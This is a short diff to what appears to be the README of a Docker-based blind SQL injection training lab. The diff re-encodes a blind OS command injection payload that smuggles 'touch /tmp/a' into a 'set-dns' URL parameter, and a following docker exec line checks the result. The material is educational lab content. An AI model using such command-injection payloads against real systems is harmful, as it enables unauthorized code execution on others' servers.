@@ -138,7 +138,7 @@ You can eventually automate the process using SQLMap. You can find a good resour
 ## 💡 Additional vulnerability
 Actually the application is also vulnerable to blind OS command injection. Try for istance the following payload:
 
-	/search?set-dns=172.20.53.53 %26 touch %2Ftmp%2Fa&id=1
+	/search?set-dns=172.20.53.53%20%26%20touch%20%2Ftmp%2Fa&id=1
 Verify that /tmp/a file is present inside the web container
 	
  	[~/blindSQLi-DNS-OOB] sudo docker exec -it blindsqli-dns-oob_web_1 /bin/bash
